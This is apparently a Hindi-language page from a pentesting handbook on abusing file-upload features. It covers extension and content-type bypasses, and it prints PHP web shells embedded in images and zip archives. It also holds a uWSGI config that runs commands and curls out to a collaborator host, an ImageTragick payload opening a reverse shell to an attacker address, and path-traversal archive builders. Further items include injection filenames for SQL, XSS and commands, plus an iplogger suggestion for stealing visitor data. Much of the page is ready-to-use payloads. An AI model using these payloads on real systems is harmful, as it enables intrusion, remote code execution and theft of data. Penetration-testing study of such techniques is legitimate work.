# फ़ाइल अपलोड

{{#include ../../banners/hacktricks-training.md}}

## फ़ाइल अपलोड सामान्य कार्यप्रणाली

अन्य उपयोगी extensions:

- **PHP**: _.php_, _.php2_, _.php3_, ._php4_, ._php5_, ._php6_, ._php7_, .phps, ._pht_, .phtm, .phtml_, ._pgif_, _.shtml, .htaccess, .phar, .inc, .hphp, .ctp, .module_
- **Working in PHPv8**: _.php_, _.php4_, _.php5_, .phtml_, .module_, .inc_, .hphp_, .ctp_
- **ASP**: _.asp, .aspx, .config, .ashx, .asmx, .aspq, .axd, .cshtm, .cshtml, .rem, .soap, .vbhtm, .vbhtml, .asa, .cer, .shtml_
- **Jsp:** _.jsp, .jspx, .jsw, .jsv, .jspf, .wss, .do, .action_
- **Coldfusion:** _.cfm, .cfml, .cfc, .dbm_
- **Flash**: _.swf_
- **Perl**: _.pl, .cgi_
- **Erlang Yaws Web Server**: _.yaws_

### फ़ाइल एक्सटेंशन्स चेक बायपास करना

1. यदि लागू हों, तो **पिछले एक्सटेंशन्स** की **जाँच** करें। इन्हें कुछ **अपरकेस अक्षरों** का उपयोग करके भी परखें: _pHp, .pHP5, .PhAr ..._
2. _जाँच करें कि क्या आप execution extension से पहले एक मान्य extension **जोड़कर** bypass कर सकते हैं (पिछले extensions का भी उपयोग करें):_
- _file.png.php_
- _file.png.Php5_
3. अंत में **विशेष वर्ण** जोड़कर कोशिश करें। आप Burp का उपयोग करके सभी **ascii** और **Unicode** वर्णों पर **bruteforce** कर सकते हैं। (_नोट कि आप पहले बताए गए **extensions** का भी उपयोग कर सकते हैं_)
- _file.php%20_
- _file.php%0a_
- _file.php%00_
- _file.php%0d%0a_
- _file.php/_
- _file.php.\\_
- _file._
- _file.php...._
- _file.pHp5...._
4. सर्वर-साइड के extension parser को **धोखा देकर** सुरक्षा को बायपास करने की कोशिश करें, जैसे **दोहराना** (doubling) या extensions के बीच **junk** डेटा (**null** bytes) जोड़ना। _आप बेहतर payload तैयार करने के लिए पहले बताए गए **extensions** का भी उपयोग कर सकते हैं।_
- _file.png.php_
- _file.png.pHp5_
- _file.php#.png_
- _file.php%00.png_
- _file.php\x00.png_
- _file.php%0a.png_
- _file.php%0d%0a.png_
- _file.phpJunk123png_
5. पिछले चेक में **एक और परत एक्सटेंशन्स** जोड़ें:
- _file.png.jpg.php_
- _file.php%00.png%00.jpg_
6. कोशिश करें कि **exec extension को वैध extension से पहले** रखें और उम्मीद करें कि सर्वर misconfigured हो। (यह Apache misconfigurations का फायदा उठाने के लिए उपयोगी है जहाँ कुछ भी जिसकी extension .php हो, लेकिन जरूरी नहीं कि यह .php पर खत्म हो, को कोड execute करवा देता है):
- _ex: file.php.png_
7. **Windows** में **NTFS alternate data stream (ADS)** का उपयोग करना। इस मामले में, एक colon character ":" एक प्रतिबंधित extension के बाद और एक अनुमत extension से पहले डाला जाएगा। परिणामस्वरूप, सर्वर पर **खाली फ़ाइल जिस पर प्रतिबंधित extension है** बन जाएगी (उदा. "file.asax:.jpg"). इस फ़ाइल को बाद में दूसरी तकनीकों से एडिट किया जा सकता है जैसे कि उसकी short filename का उपयोग करना। "**::$data**” पैटर्न का उपयोग non-empty files बनाने के लिए भी किया जा सकता है। इसलिए, इस पैटर्न के बाद एक dot character जोड़ना भी आगे की प्रतिबंधों को बायपास करने में उपयोगी हो सकता (.e.g. "file.asp::$data.")
8. फ़ाइलनाम की सीमा तोड़ने की कोशिश करें। वैध extension कट जाता है और malicious PHP बच जाता है। AAA<--SNIP-->AAA.php

```
# Linux maximum 255 bytes
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 255
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4 # minus 4 here and adding .png
# Upload the file and check response how many characters it alllows. Let's say 236
python -c 'print "A" * 232'
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
# Make the payload
AAA<--SNIP 232 A-->AAA.php.png
```

### Content-Type, Magic Number, Compression & Resizing को बायपास करना

- Content-Type चेक को बायपास करने के लिए Content-Type header के मान को सेट करें: _image/png_ , _text/plain , application/octet-stream_
1. Content-Type **वर्डलिस्ट**: [https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/Web/content-type.txt](https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/Web/content-type.txt)
- **magic number** चेक को बायपास करने के लिए फ़ाइल के आरंभ में असली इमेज के बाइट्स जोड़ें (जिससे _file_ कमांड भ्रमित हो जाए)। या shell को इमेज के **metadata** में डालें:\
`exiftool -Comment="<?php echo 'Command:'; if($_POST){system($_POST['cmd']);} __halt_compiler();" img.jpg`\
`\` या आप payload को सीधे इमेज में भी डाल सकते हैं:\
`echo '<?php system($_REQUEST['cmd']); ?>' >> img.png`
- यदि आपकी image पर compressions लागू किए जा रहे हैं, उदाहरण के लिए कुछ standard PHP लाइब्रेरीज जैसे [PHP-GD](https://www.php.net/manual/fr/book.image.php) का उपयोग हो रहा है, तो उपर्युक्त तकनीकें उपयोगी नहीं होंगी। हालांकि, आप **PLTE chunk** [**तकनीक यहाँ परिभाषित है**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) का उपयोग करके कुछ टेक्स्ट डाल सकते हैं जो **compression में टिक जाएगा**।
- [**Github with the code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_plte_png.php)
- वेब पेज image को **resizing** भी कर सकता है, उदाहरण के लिए PHP-GD के `imagecopyresized` या `imagecopyresampled` फ़ंक्शंस का उपयोग करके। हालांकि, आप **IDAT chunk** [**तकनीक यहाँ परिभाषित है**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) का उपयोग कर सकते हैं ताकि कुछ टेक्स्ट डालकर वह **compression में बच जाए**।
- [**Github with the code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_idat_png.php)
- एक और तकनीक जो image resizing से बचने वाला payload बनाने के लिए है, PHP-GD फ़ंक्शन `thumbnailImage` का उपयोग करना। हालांकि, आप **tEXt chunk** [**तकनीक यहाँ परिभाषित है**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) का उपयोग कर सकते हैं ताकि टेक्स्ट **compression में बचा रहे**।
- [**Github with the code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_tEXt_png.php)

### जांचने के अन्य तरकीबें

- पहले से अपलोड की गई फ़ाइल का नाम बदलने की किसी vulnerability को खोजें (extension बदलने के लिए)।
- फ़ाइल अपलोड के बाद backdoor execute करने के लिए कोई **Local File Inclusion** vulnerability खोजें।
- **संभव Information disclosure**:
1. एक ही नाम वाली फ़ाइल को **कई बार** (और एक ही समय में) अपलोड करें।
2. किसी ऐसे फ़ाइल या फ़ोल्डर के नाम पर फ़ाइल अपलोड करें जो पहले से मौजूद हो।
3. फ़ाइल का नाम `"."`, "..” या "…” जैसा होना कोशिश करें। उदाहरण के लिए, Apache में Windows पर यदि एप्लिकेशन अपलोड की गई फ़ाइलों को "/www/uploads/" निर्देशिका में सहेजता है, तो "." फ़ाइलनाम "/www/" निर्देशिका में "uploads" नाम की फ़ाइल बना देगा।
4. ऐसी फ़ाइल अपलोड करें जिसे आसानी से हटाया न जा सके, जैसे **"…:.jpg”** NTFS में। (Windows)
5. Windows में ऐसे फ़ाइल नाम के साथ अपलोड करें जिनमें अवैध वर्ण हों जैसे `|<>*?”`।
6. Windows में reserved (forbidden) नामों का उपयोग करके फ़ाइल अपलोड करें जैसे CON, PRN, AUX, NUL, COM1, COM2, COM3, COM4, COM5, COM6, COM7, COM8, COM9, LPT1, LPT2, LPT3, LPT4, LPT5, LPT6, LPT7, LPT8, और LPT9।
- किसी executable (.exe) या एक .html (कम संदेहजनक) फ़ाइल को भी अपलोड करने की कोशिश करें जो victim द्वारा गलती से खोलने पर कोड execute कर दे।

### Special extension tricks

यदि आप फ़ाइलें किसी **PHP server** पर अपलोड करने की कोशिश कर रहे हैं, तो कोड execute करने के लिए [**.htaccess** trick देखें](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/php-tricks-esp/index.html#code-execution).\
यदि आप किसी **ASP server** पर फ़ाइलें अपलोड कर रहे हैं, तो कोड execute करने के लिए [**.config** trick देखें](../../network-services-pentesting/pentesting-web/iis-internet-information-services.md#execute-config-files).

`.phar` फ़ाइलें java के `.jar` जैसी होती हैं, पर php के लिए, और इन्हें **php फ़ाइल की तरह उपयोग** किया जा सकता है (php के साथ execute करना, या किसी स्क्रिप्ट में include करना...)

`.inc` extension कभी-कभी php फ़ाइलों के लिए उपयोग किया जाता है जो केवल फ़ाइलें import करने के लिए होते हैं, इसलिए कभी-कभी किसी ने इस extension को execute करने की अनुमति दे दी हो सकती है।

## **Jetty RCE**

यदि आप किसी Jetty सर्वर में XML फ़ाइल अपलोड कर सकते हैं तो आप [RCE हासिल कर सकते हैं क्योंकि **new \*.xml and \*.war are automatically processed**](https://twitter.com/ptswarm/status/1555184661751648256/photo/1)**.** जैसा कि निम्नलिखित इमेज में बताया गया है, XML फ़ाइल को `$JETTY_BASE/webapps/` में अपलोड करें और shell की उम्मीद करें!

![https://twitter.com/ptswarm/status/1555184661751648256/photo/1](<../../images/image (1047).png>)

## **uWSGI RCE**

इस vulnerability की विस्तृत जांच के लिए मूल रिसर्च देखें: [uWSGI RCE Exploitation](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html).

Remote Command Execution (RCE) vulnerabilities उन uWSGI सर्वरों में exploit की जा सकती हैं जहाँ किसी के पास `.ini` configuration फ़ाइल को संशोधित करने की क्षमता हो। uWSGI configuration फाइलें "magic" variables, placeholders, और operators को शामिल करने के लिए विशेष syntax का उपयोग करती हैं। विशेष रूप से, '@' operator, `@(filename)` के रूप में उपयोग किया जाता है, यह फ़ाइल की सामग्री को शामिल करने के लिए डिज़ाइन किया गया है। uWSGI में विभिन्न supported schemes में से, "exec" scheme विशेष रूप से शक्तिशाली है, जो किसी प्रक्रिया के standard output से डेटा पढ़ने की अनुमति देता है। जब कोई `.ini` configuration फ़ाइल process की जाती है, तो इस फीचर का दुरुपयोग Remote Command Execution या Arbitrary File Write/Read के लिए किया जा सकता है।

निम्नलिखित हानिकारक `uwsgi.ini` फ़ाइल का एक उदाहरण विचार करें, जो विभिन्न schemes को दर्शाती है:
```ini
[uwsgi]
; read from a symbol
foo = @(sym://uwsgi_funny_function)
; read from binary appended data
bar = @(data://[REDACTED])
; read from http
test = @(http://[REDACTED])
; read from a file descriptor
content = @(fd://[REDACTED])
; read from a process stdout
body = @(exec://whoami)
; curl to exfil via collaborator
extra = @(exec://curl http://collaborator-unique-host.oastify.com)
; call a function returning a char *
characters = @(call://uwsgi_func)
```
The execution of the payload occurs during the parsing of the configuration file. For the configuration to be activated and parsed, the uWSGI process must either be restarted (potentially after a crash or due to a Denial of Service attack) or the file must be set to auto-reload. The auto-reload feature, if enabled, reloads the file at specified intervals upon detecting changes.

यह समझना महत्वपूर्ण है कि uWSGI की configuration file parsing कितनी ढीली है। विशेष रूप से, चर्चित payload को एक binary file (जैसे image या PDF) में insert किया जा सकता है, जो संभावित exploitation के दायरे को और बढ़ा देता है।

## **wget File Upload/SSRF Trick**

कुछ मामलों में आप पाएंगे कि सर्वर **`wget`** का उपयोग **फ़ाइलें डाउनलोड** करने के लिए कर रहा है और आप **URL** निर्दिष्ट कर सकते हैं। ऐसे मामलों में, कोड यह जाँच कर सकता है कि डाउनलोड की गई फ़ाइलों का extension एक whitelist के अंदर है ताकि केवल अनुमत फ़ाइलें डाउनलोड हों। हालांकि, **यह जाँच bypass की जा सकती है।**\
**linux** में एक **filename** की **maximum** लंबाई **255** है, हालांकि **wget** फ़ाइल नामों को **236** characters तक truncate कर देता है। आप **download a file called "A"\*232+".php"+".gif"** कर सकते हैं; यह filename **check को bypass** कर देगा (जैसा कि इस उदाहरण में **".gif"** एक **valid** extension है) लेकिन `wget` फ़ाइल को **rename** करके **"A"\*232+".php"** कर देगा।
```bash
#Create file and HTTP server
echo "SOMETHING" > $(python -c 'print("A"*(236-4)+".php"+".gif")')
python3 -m http.server 9080
```

```bash
#Download the file
wget 127.0.0.1:9080/$(python -c 'print("A"*(236-4)+".php"+".gif")')
The name is too long, 240 chars total.
Trying to shorten...
New name is AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.
--2020-06-13 03:14:06--  http://127.0.0.1:9080/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.gif
Connecting to 127.0.0.1:9080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 10 [image/gif]
Saving to: ‘AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php’

AAAAAAAAAAAAAAAAAAAAAAAAAAAAA 100%[===============================================>]      10  --.-KB/s    in 0s

2020-06-13 03:14:06 (1.96 MB/s) - ‘AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php’ saved [10/10]
```
ध्यान दें कि **एक और विकल्प** जो आप इस चेक को बायपास करने के लिए सोच रहे होंगे वह यह है कि **HTTP server को किसी अलग फाइल पर redirect** कर दिया जाए, ताकि शुरुआती URL चेक को बायपास कर दे और फिर wget redirected फाइल को नए नाम के साथ डाउनलोड कर ले। यह **काम नहीं करेगा** **जब तक** wget को `--trust-server-names` पैरामीटर के साथ उपयोग न किया गया हो क्योंकि **wget redirected पेज को मूल URL में बताये गए फाइल नाम के साथ ही डाउनलोड करेगा**।

## टूल्स

- [Upload Bypass](https://github.com/sAjibuu/Upload_Bypass) एक शक्तिशाली टूल है जो Pentesters and Bug Hunters को file upload mechanisms के परीक्षण में मदद करने के लिए डिज़ाइन किया गया है। यह विभिन्न bug bounty तकनीकों का उपयोग करके कमजोरियों की पहचान और exploitation की प्रक्रिया को सरल बनाता है, और web applications का thorough आकलन सुनिश्चित करता है।

### snprintf quirks के साथ upload indices को corrupt करना (historical)

कुछ legacy upload handlers जो `snprintf()` या इसी तरह के फ़ंक्शन का उपयोग करके single-file upload से multi-file arrays बनाते हैं, उन्हें `_FILES` संरचना को फ़ोर्ज करने के लिए trick किया जा सकता है। `snprintf()` के inconsistent और truncation व्यवहार के कारण, सावधानीपूर्वक निर्मित एक single upload सर्वर साइड पर कई indexed files के रूप में दिखाई दे सकता है, जिससे वह logic भ्रमित हो जाता है जो एक सख्त आकार मानता है (उदा., इसे multi-file upload मानकर unsafe branches पर जाना)। आज के समय में यह पैटर्न niche है, फिर भी यह “index corruption” pattern कभी-कभी CTFs और पुराने codebases में फिर से उभरता है।

## फ़ाइल अपलोड से अन्य कमजोरियाँ

- **filename** को `../../../tmp/lol.png` पर सेट करें और **path traversal** हासिल करने की कोशिश करें
- **filename** को `sleep(10)-- -.jpg` पर सेट करें और आप संभवतः **SQL injection** प्राप्त कर सकते हैं
- **filename** को `<svg onload=alert(document.domain)>` पर सेट करें ताकि XSS हो सके
- **filename** को `; sleep 10;` पर सेट करके कुछ command injection का परीक्षण करें (अधिक [command injections tricks here](../command-injection.md))
- [**XSS** in image (svg) file upload](../xss-cross-site-scripting/index.html#xss-uploading-files-svg)
- **JS** file **upload** + **XSS** = [**Service Workers** exploitation](../xss-cross-site-scripting/index.html#xss-abusing-service-workers)
- [**XXE in svg upload**](../xxe-xee-xml-external-entity.md#svg-file-upload)
- [**Open Redirect** via uploading svg file](../open-redirect.md#open-redirect-uploading-svg-files)
- Try **different svg payloads** from [**https://github.com/allanlw/svg-cheatsheet**](https://github.com/allanlw/svg-cheatsheet)
- [Famous **ImageTrick** vulnerability](https://mukarramkhalid.com/imagemagick-imagetragick-exploit/)
- अगर आप web server को किसी URL से image पकड़ने के लिए निर्देशित कर सकते हैं तो आप [SSRF](../ssrf-server-side-request-forgery/index.html) का दुरुपयोग करने का प्रयास कर सकते हैं। यदि यह **image** किसी **public** साइट पर **saved** की जा रही है, तो आप [https://iplogger.org/invisible/] से एक URL भी दे सकते हैं और हर विज़िटर की जानकारी **steal** कर सकते हैं।
- [**XXE and CORS** bypass with PDF-Adobe upload](pdf-upload-xxe-and-cors-bypass.md)
- Specially crafted PDFs to XSS: The [following page present how to **inject PDF data to obtain JS execution**](../xss-cross-site-scripting/pdf-injection.md). अगर आप PDFs upload कर सकते हैं तो आप ऐसा PDF तैयार कर सकते हैं जो दिए गए निर्देशों का पालन करते हुए arbitrary JS execute करेगा।
- Upload the \[eicar]\([**https://secure.eicar.org/eicar.com.txt**](https://secure.eicar.org/eicar.com.txt)) content ताकि यह जाँचा जा सके कि सर्वर में कोई **antivirus** है या नहीं
- जाँचें कि फ़ाइलें upload करने पर कोई **size limit** है या नहीं

यहाँ एक टॉप 10 सूची है कि आप अपलोड करके क्या हासिल कर सकते हैं (from [here](https://twitter.com/SalahHasoneh1/status/1281274120395685889)):

1. **ASP / ASPX / PHP5 / PHP / PHP3**: Webshell / RCE
2. **SVG**: Stored XSS / SSRF / XXE
3. **GIF**: Stored XSS / SSRF
4. **CSV**: CSV injection
5. **XML**: XXE
6. **AVI**: LFI / SSRF
7. **HTML / JS** : HTML injection / XSS / Open redirect
8. **PNG / JPEG**: Pixel flood attack (DoS)
9. **ZIP**: RCE via LFI / DoS
10. **PDF / PPTX**: SSRF / BLIND XXE

#### Burp Extension


{{#ref}}
https://github.com/portswigger/upload-scanner
{{#endref}}

## मैजिक हेडर बाइट्स

- **PNG**: `"\x89PNG\r\n\x1a\n\0\0\0\rIHDR\0\0\x03H\0\xs0\x03["`
- **JPG**: `"\xff\xd8\xff"`

अन्य filetypes के लिए [https://en.wikipedia.org/wiki/List_of_file_signatures] देखें।

## Zip/Tar फ़ाइल का सर्वर पर स्वतः अनपैक होने वाला अपलोड

अगर आप ऐसा ZIP upload कर सकते हैं जिसे सर्वर के अंदर decompress किया जाएगा, तो आप दो चीज़ें कर सकते हैं:

### Symlink

ऐसा archive upload करें जिसमें अन्य फ़ाइलों के soft links शामिल हों; फिर जब आप decompressed फ़ाइलों तक पहुँचेंगे तो आप linked फ़ाइलों तक भी पहुँच प्राप्त कर लेंगे:
```
ln -s ../../../index.php symindex.txt
zip --symlinks test.zip symindex.txt
tar -cvf test.tar symindex.txt
```
### Decompress in different folders

Decompression के दौरान directories में फाइलों का अनपेक्षित निर्माण एक गंभीर समस्या है। शुरुआती धारणा के बावजूद कि यह सेटअप malicious file uploads के जरिए OS-level command execution से सुरक्षा कर सकता है, ZIP archive format के hierarchical compression support और directory traversal क्षमताओं का दुरुपयोग किया जा सकता है। इससे attackers decompression functionality को manipulate करके restrictions को bypass कर secure upload directories से बाहर निकल सकते हैं।

An automated exploit to craft such files is available at [**evilarc on GitHub**](https://github.com/ptoomey3/evilarc). The utility can be used as shown:
```python
# Listing available options
python2 evilarc.py -h
# Creating a malicious archive
python2 evilarc.py -o unix -d 5 -p /var/www/html/ rev.php
```
इसके अतिरिक्त, **symlink trick with evilarc** एक विकल्प है। यदि उद्देश्य `/flag.txt` जैसी फ़ाइल को लक्ष्य बनाना है, तो उस फ़ाइल के लिए अपने सिस्टम में एक symlink बनाया जाना चाहिए। यह सुनिश्चित करता है कि evilarc अपने संचालन के दौरान त्रुटियों का सामना न करे।

नीचे एक उदाहरण दिया गया है Python कोड का, जिसका उपयोग एक malicious zip file बनाने के लिए किया जाता है:
```python
#!/usr/bin/python
import zipfile
from io import BytesIO

def create_zip():
f = BytesIO()
z = zipfile.ZipFile(f, 'w', zipfile.ZIP_DEFLATED)
z.writestr('../../../../../var/www/html/webserver/shell.php', '<?php echo system($_REQUEST["cmd"]); ?>')
z.writestr('otherfile.xml', 'Content of the file')
z.close()
zip = open('poc.zip','wb')
zip.write(f.getvalue())
zip.close()

create_zip()
```
**Abusing compression for file spraying**

अधिक जानकारी के लिए **मूल पोस्ट देखें**: [https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/](https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/)

1.  **PHP Shell बनाना**: PHP कोड लिखा गया है जो `$_REQUEST` वेरियेबल के माध्यम से पास किए गए कमांड्स को चलाता है।

```php
<?php
if(isset($_REQUEST['cmd'])){
$cmd = ($_REQUEST['cmd']);
system($cmd);
}?>
```

2.  **File Spraying और Compressed File Creation**: कई फाइलें बनाई जाती हैं और इन फाइलों को सम्मिलित करते हुए एक zip archive बनाया जाता है।

```bash
root@s2crew:/tmp# for i in `seq 1 10`;do FILE=$FILE"xxA"; cp simple-backdoor.php $FILE"cmd.php";done
root@s2crew:/tmp# zip cmd.zip xx*.php
```

3.  **Hex Editor या vi के साथ संशोधन**: zip के अंदर मौजूद फाइलों के नाम vi या hex editor से बदले जाते हैं — 'xxA' को '../' में बदलकर directories को traverse किया जाता है।

```bash
:set modifiable
:%s/xxA/..\//g
:x!
```

## ImageTragic

इस कंटेंट को image extension के साथ upload करें ताकि यह vulnerability exploit की जा सके **(ImageMagick , 7.0.1-1)** (exploit के लिए देखें: [https://www.exploit-db.com/exploits/39767](https://www.exploit-db.com/exploits/39767))
```
push graphic-context
viewbox 0 0 640 480
fill 'url(https://127.0.0.1/test.jpg"|bash -i >& /dev/tcp/attacker-ip/attacker-port 0>&1|touch "hello)'
pop graphic-context
```
## PNG में PHP Shell एम्बेड करना

PNG फ़ाइल के IDAT chunk में PHP shell एम्बेड करने से कुछ छवि प्रसंस्करण ऑपरेशनों को प्रभावी रूप से बाइपास किया जा सकता है। PHP-GD के फ़ंक्शन `imagecopyresized` और `imagecopyresampled` इस संदर्भ में विशेष रूप से प्रासंगिक हैं, क्योंकि इन्हें आमतौर पर छवियों को resizing और resampling करने के लिए इस्तेमाल किया जाता है। इन ऑपरेशनों से प्रभावित न होने की क्षमता कुछ उपयोग मामलों के लिए एक महत्वपूर्ण लाभ है।

इस तकनीक का विस्तृत अन्वेषण, इसकी कार्यप्रणाली और संभावित उपयोग सहित, निम्नलिखित लेख में दिया गया है: ["Encoding Web Shells in PNG IDAT chunks"](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/). यह संसाधन प्रक्रिया और इसके निहितार्थों की व्यापक समझ प्रदान करता है।

अधिक जानकारी: [https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)

## Polyglot फ़ाइलें

Polyglot फ़ाइलें साइबर सुरक्षा में एक अनोखा उपकरण हैं, जो चमेली की तरह काम करती हैं और एक साथ कई फ़ाइल फ़ॉर्मैट्स में वैध रूप से मौजूद हो सकती हैं। एक रोचक उदाहरण [GIFAR](https://en.wikipedia.org/wiki/Gifar) है, एक हाइब्रिड जो GIF और RAR archive दोनों के रूप में कार्य करता है। ऐसी फ़ाइलें केवल इसी जोड़ी तक सीमित नहीं हैं; GIF और JS या PPT और JS जैसे संयोजन भी संभव हैं।

Polyglot फ़ाइलों की मुख्य उपयोगिता इस क्षमताओं में निहित है कि वे उन सुरक्षा उपायों को बाईपास कर सकती हैं जो फ़ाइलों को उनके प्रकार के आधार पर स्क्रीन करते हैं। विभिन्न अनुप्रयोगों में सामान्य प्रथा यह होती है कि केवल कुछ फ़ाइल प्रकारों को upload की अनुमति दी जाती है — जैसे JPEG, GIF, या DOC — ताकि संभावित हानिकर फ़ॉर्मैट्स (उदा., JS, PHP, या Phar फ़ाइलें) से जोखिम कम किया जा सके। हालांकि, एक polyglot कई फ़ाइल प्रकारों की संरचनात्मक मानदंडों का पालन करके इन प्रतिबंधों को चुपके से बाइपास कर सकता है।

अपनी अनुकूलता के बावजूद, polyglots को सीमाएँ भी आती हैं। उदाहरण के लिए, जबकि एक polyglot एक साथ PHAR फ़ाइल (PHp ARchive) और JPEG दोनों हो सकती है, इसकी upload की सफलता प्लेटफ़ॉर्म की फ़ाइल एक्सटेंशन नीतियों पर निर्भर कर सकती है। यदि सिस्टम अनुमत एक्सटेंशनों के प्रति सख्त है, तो केवल संरचनात्मक द्वैत होने से polyglot का अपलोड सुनिश्चित नहीं होगा।

अधिक जानकारी: [https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a](https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a)

### PDF जैसा दिखाकर valid JSON अपलोड करना

PDF फ़ाइल बनाकर यह दिखाकर कि यह PDF है, अनुमति न होने पर भी वैध JSON फ़ाइल अपलोड करके file type detections से कैसे बचा जा सकता है (तकनीकें **[this blog post](https://blog.doyensec.com/2025/01/09/cspt-file-upload.html)** से):

- **`mmmagic` library**: जैसा कि `%PDF` magic bytes पहले 1024 bytes में होते हैं तो यह valid माना जाता है (उदाहरण पोस्ट में देखें)
- **`pdflib` library**: JSON के एक filed में fake PDF format डालें ताकि library इसे pdf समझे (उदाहरण पोस्ट में देखें)
- **`file` binary**: यह फ़ाइल से 1048576 bytes तक पढ़ सकता है। बस JSON को इससे बड़ा बना दें ताकि यह इसे json के रूप में पार्स न कर सके और फिर JSON के अंदर एक वास्तविक PDF का प्रारंभिक हिस्सा रख दें और यह इसे PDF समझ लेगा

## संदर्भ

- [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files)
- [https://github.com/modzero/mod0BurpUploadScanner](https://github.com/modzero/mod0BurpUploadScanner)
- [https://github.com/almandin/fuxploider](https://github.com/almandin/fuxploider)
- [https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html)
- [https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)
- [https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a](https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a)
- [https://blog.doyensec.com/2025/01/09/cspt-file-upload.html](https://blog.doyensec.com/2025/01/09/cspt-file-upload.html)
- [The Art of PHP: CTF‑born exploits and techniques](https://blog.orange.tw/posts/2025-08-the-art-of-php-ch/)

{{#include ../../banners/hacktricks-training.md}}
